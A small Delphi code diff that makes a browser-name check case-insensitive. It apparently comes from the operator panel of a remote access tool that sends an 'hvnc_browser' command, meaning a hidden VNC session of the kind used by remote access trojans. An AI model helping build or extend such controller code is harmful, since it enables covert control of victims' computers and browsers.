@@ -540,7 +540,7 @@ begin
 
   JSONObj := TJSONObject.Create;
   try
-    if ComboBox2.Text = 'chrome.exe' then
+    if SameText(ComboBox2.Text, 'chrome.exe') then
     begin
       JSONObj.AddPair('action', 'hvnc_browser');
       JSONObj.AddPair('browser', 'chrome.exe');
